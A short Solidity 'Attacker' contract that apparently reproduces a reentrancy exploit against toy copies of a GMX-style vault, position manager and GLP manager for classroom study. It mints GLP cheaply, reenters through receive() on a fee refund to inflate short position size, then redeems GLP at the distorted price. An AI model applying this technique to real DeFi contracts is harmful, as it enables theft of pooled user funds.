// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./BasicERC20.sol";
import "./Vault.sol";
import "./ShortsTracker.sol";
import "./Oracle.sol";
import "./PositionManager.sol";
import "./GlpManager.sol";


contract Attacker {
    ToyVault public immutable vault;
    ToyPositionManager public immutable pm;
    ToyGlpManager public immutable glp;
    DummyUSDC public immutable usdc;
    address public immutable indexToken;

    constructor(address _vault, address payable _pm, address _glp, address _usdc, address _index) {
        vault = ToyVault(_vault);
        pm    = ToyPositionManager(_pm);
        glp   = ToyGlpManager(_glp);
        usdc  = DummyUSDC(_usdc);
        indexToken = _index;
    }

    // 1) Mint GLP "cheap" before distortion
    function prime() external {
        usdc.mint(address(this), 10_000e18);                 // 10,000 USDC (classroom mint)
        usdc.approve(address(glp), type(uint256).max);
        glp.mintAndStakeGlp(10_000e18);
    }

    // 2) Reenter here when PM refunds the exec fee
    receive() external payable {
        // Directly bump short SIZE (avg was just set low via PM route) → split-brain
        vault.increasePosition(indexToken, 1_000_000e18 /*$1M notional*/, false);
    }

    // 3) Redeem GLP at inflated price
    function cashOut() external {
        uint256 glpAmt = glp.balanceOf(address(this));
        glp.redeemGlp(glpAmt, msg.sender);
    }
}